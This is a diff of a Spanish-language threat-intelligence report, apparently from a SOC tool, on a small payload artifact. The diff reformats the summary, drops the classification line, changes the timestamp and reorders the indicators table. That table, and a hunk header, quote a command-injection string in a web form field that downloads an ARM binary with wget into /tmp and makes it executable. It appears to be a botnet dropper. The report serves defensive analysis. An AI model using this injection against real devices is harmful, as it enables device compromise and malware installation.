@@ -4,16 +4,16 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto de 390 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.23. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 3 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
-- **Categoría:** `Payload`
 - **Riesgo:** `Medium`
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:49:11+00:00`
+- **Registrado:** `2026-08-09T19:49:11.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -50,10 +50,10 @@ act=signin&lang=en&outemail=`cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wg
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 190.179.168.XXX | static_analysis |
 | ip | 201.51.13.XXX | static_analysis |
-| hash | 6eb9daf455c49b2e8d387ff8e3c40a3c91086765f4e544d780fe2ad725721db8 | static_analysis |
+| ip | 190.179.168.XXX | static_analysis |
 | command | act=signin&lang=en&outemail=`cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wget%2Bhttp:/\/201.51.13.XXX/main_arm7;chmo | strings |
+| hash | 6eb9daf455c49b2e8d387ff8e3c40a3c91086765f4e544d780fe2ad725721db8 | static_analysis |
 
 ## 🔎 Triage
 
